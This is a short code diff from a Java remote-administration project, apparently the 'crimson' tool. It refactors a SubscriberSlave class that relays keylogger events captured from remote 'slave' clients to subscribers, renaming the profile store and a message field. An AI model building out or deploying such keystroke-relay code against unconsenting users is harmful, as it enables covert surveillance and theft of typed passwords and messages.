@@ -24,13 +24,13 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.store.LcvidStore;
+import com.subterranean_security.crimson.core.store.ProfileStore;
 import com.subterranean_security.crimson.core.stream.Stream;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
 import com.subterranean_security.crimson.proto.core.net.sequences.Stream.Param;
 import com.subterranean_security.crimson.proto.core.net.sequences.Stream.SubscriberParam;
-import com.subterranean_security.crimson.server.store.ServerProfileStore;
 import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 
@@ -52,7 +52,7 @@ public class SubscriberSlave extends Stream implements Observer {
 	public void start() {
 
 		if (param().getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ServerProfileStore.getClient(param().getSlaveID());
+			ClientProfile cp = ProfileStore.getClient(param().getSlaveID());
 
 			if (cp != null) {
 				cp.getKeylog().addObserver(this);
@@ -66,7 +66,7 @@ public class SubscriberSlave extends Stream implements Observer {
 	@Override
 	public void stop() {
 		if (param().getSubscriberParam().getKeylog()) {
-			ClientProfile cp = ServerProfileStore.getClient(param().getSlaveID());
+			ClientProfile cp = ProfileStore.getClient(param().getSlaveID());
 
 			if (cp != null) {
 				cp.getKeylog().deleteObserver(this);
@@ -78,7 +78,7 @@ public class SubscriberSlave extends Stream implements Observer {
 	public void update(Observable arg0, Object arg1) {
 		if (arg0 instanceof Log) {
 			EV_KEvent ev = (EV_KEvent) arg1;
-			write(Message.newBuilder().setEvKevent(ev).setSid(param().getSlaveID()));
+			write(Message.newBuilder().setEvKevent(ev).setFrom(param().getSlaveID()));
 		}
 
 	}
